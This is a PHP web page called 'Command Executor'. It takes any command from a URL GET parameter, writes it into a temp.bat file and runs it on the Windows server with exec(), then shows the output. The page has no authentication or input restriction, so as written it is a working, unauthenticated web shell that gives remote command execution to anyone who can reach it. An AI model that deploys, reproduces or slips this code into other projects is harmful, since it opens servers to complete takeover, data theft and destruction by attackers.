<!DOCTYPE html>
<html>
<head>
    <title>Command Executor</title>
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body class="w3-container w3-dark-grey w3-padding-32">

<div class="w3-container w3-card-4 w3-white w3-round-large w3-margin-top" style="max-width: 1200px; margin: 0 auto;">
    
    <!-- Header -->
    <div class="w3-container w3-blue w3-round-top">
        <h2 class="w3-margin-0 w3-padding">Command Executor</h2>
        <p class="w3-margin-0 w3-padding w3-small">Execute system commands</p>
    </div>
    
    <!-- Main Content -->
    <div class="w3-container w3-padding-24">
        <!-- Command Form -->
        <div class="w3-panel w3-light-grey w3-round w3-padding">
            <form action="index2.php" method="GET">
                <label class="w3-text-blue w3-medium"><b>Enter Command:</b></label>
                <textarea 
                    name="command" 
                    class="w3-input w3-border w3-round w3-margin-top w3-margin-bottom" 
                    style="height: 100px; resize: vertical;"
                    placeholder="Enter command here..."
                ><?php echo htmlspecialchars($_GET['command'] ?? ''); ?></textarea>
                
                <div class="w3-center">
                    <button type="submit" class="w3-button w3-blue w3-round w3-padding-large w3-hover-dark-blue">
                        <b>Execute Command</b>
                    </button>
                </div>
            </form>
        </div>
        
        <!-- Output Section -->
        <div class="w3-margin-top">
            <?php
            $cmd = $_GET['command'] ?? null;
            if ($cmd == null) {
                echo '
                <div class="w3-panel w3-yellow w3-round w3-padding">
                    <h5><i class="w3-large">⚠</i> No Command Entered</h5>
                    <p>Enter a command in the text area above and click "Execute Command".</p>
                </div>';
            } else {
                echo '
                <div class="w3-panel w3-blue w3-round w3-padding">
                    <h5><i class="w3-large">▶</i> Executing Command:</h5>
                    <div class="w3-code w3-light-grey w3-round w3-padding">
                        ' . htmlspecialchars($cmd) . '
                    </div>
                </div>';
                
                echo '<div class="w3-panel w3-black w3-round w3-padding w3-margin-top">';
                echo '<h6><b>Command Output:</b></h6>';
                echo '<div class="w3-code w3-dark-grey w3-round w3-padding w3-small" style="overflow-x: auto;">';
                
                $out = null;
                $file = fopen("temp.bat", "w");
                fwrite($file, "cd C:/\nchcp 437\n" . $cmd);
                fclose($file);
                exec("temp.bat", $out);
                
                if (!empty($out)) {
                    foreach ($out as $x) {
                        echo htmlspecialchars($x) . "<br>";
                    }
                } else {
                    echo '<span class="w3-text-grey">No output returned.</span>';
                }
                
                echo '</div></div>';
            }
            ?>
        </div>
        
        <!-- Footer Note -->
        <div class="w3-panel w3-border-top w3-border-blue w3-padding-16 w3-center">
            <p class="w3-text-grey w3-small">All commands are executed on the server.</p>
        </div>
    </div>
</div>

</body>
</html>
